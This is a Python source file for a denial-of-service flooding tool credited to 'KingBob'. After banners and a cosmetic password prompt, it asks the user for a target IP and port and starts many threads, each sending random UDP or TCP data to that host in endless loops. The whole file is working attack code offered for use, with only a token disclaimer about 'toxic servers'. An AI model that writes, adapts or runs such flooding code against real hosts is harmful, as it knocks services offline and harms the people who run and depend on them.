import random
import socket
import threading
import os
import sys
import time
from time import sleep
import random, socket, threading
import os
import getpass

os.system("clear")
print("""\033[93m
█████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░     
             \033[93m>> \033[96mSubscribe To Channel, Ddos Tools By KingBob \033[93m<< 
        
             \033[93m>> \033[96mCoded By: KingBob KingBob \033[93m<<   
                                
            \033[97m
   ███                                                                                
  █   █
\033[97m  █   █                      \033[93m Subscribe KingBob
\033[97m█████████               ██   \033[93m Or You Can Just Join Our Discord Server, Link??
\033[97m█████████              █  █  \033[93m COMINGSOON
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m      
    
""") 

password ="bobs"

for i in range(4):
	pwd = input("[•] Input Password : ")
	j=3
	if(pwd==password):
		time.sleep(1)
		print("[•] Check Password ")
		break
	else:
		time.sleep(2)
		print("\033[91m[×] Your Password is Wrong !!! ")
		continue
time.sleep(1)
print("Your Password is Correct!!!! \033[92m[√]\033[0m ")
time.sleep(2)
os.system("clear")

os.system("clear")
print("""\033[32m
   
               \033[35mAuthor : \033[37mKingBob 
               \033[35mCoded : \033[37mKingBob
               \033[35mMethods : \033[37mUDP - TCP
       
\033[35mCredit To You KingBob        """)

ip = str(input("[•] Target Ip > "))
port = int(input("[•] Target Port > "))
choice = str(input("[•] Methods (udp/tcp) > "))
times = int(input("[•] Connections (default 450) > "))
threads = int(input("[+] Threads (default 28000) > "))

os.system("clear")

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.105)
              
type(""" please wait this ddos ​​tool don't use it for evil we only use it on toxic servers and don't abuse it, it has bad karma in return if used in the wrong way """)

os.system("clear")

def ddos():
	data = random._urandom(666)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print("\u001b[31m[!] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			print("\u001b[31m[×] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))

def ddos2():
	data = random._urandom(600000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[!] Kingbob Is ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))

def ddos3():
	data = random._urandom(600000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[!] Kingbob Is ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))

def ddos2():
	data = random._urandom(800)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print("\u001b[31m[!] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
		except:
			s.close()
			print("\u001b[31m[×] Kingbob Is ATTACKING This IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = ddos)
		th.start()
		th = threading.Thread(target = ddos2)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = ddos3)
		th.start()